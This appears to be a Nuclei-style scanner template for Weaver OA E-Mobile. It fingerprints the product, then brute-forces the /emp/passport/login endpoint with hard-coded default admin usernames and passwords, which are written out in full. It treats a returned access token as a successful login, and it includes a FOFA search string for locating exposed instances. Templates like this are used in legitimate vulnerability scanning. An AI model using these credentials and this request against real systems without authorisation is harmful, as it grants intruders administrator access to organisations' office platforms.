id: poc-yaml-weaver-e-mobile-hard-coded-password
info:
  name: 泛微OA E-Mobile 硬编码口令漏洞
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password
  metadata:
    finger: e-mobile
    fofa: app="泛微-EMobile" && icon_hash="2062026853"

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "移动管理平台-企业管理"
      - type: status
        status:
          - 200

  - method: POST
    path:
      - "{{BaseURL}}/emp/passport/login"
    headers:
      Content-Type: application/json
    payloads:
      username:
        - sysadmin
        - msgadmin
      password:
        - sysadmin
        - "Weaver#2012!@#"
        - "Weaver@2001"
    body: |
      {"key":"","loginid":"{{username}}","password":"{{password}}"}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "access_token"
          - "base_user_name"
          - "issysadmin"
          - "系统管理员"
      - type: status
        status:
          - 200
    stop-at-first-match: true
    attack: clusterbomb

variables:
  username:
    - sysadmin
    - msgadmin
  password:
    - sysadmin
    - "Weaver#2012!@#"
    - "Weaver@2001"
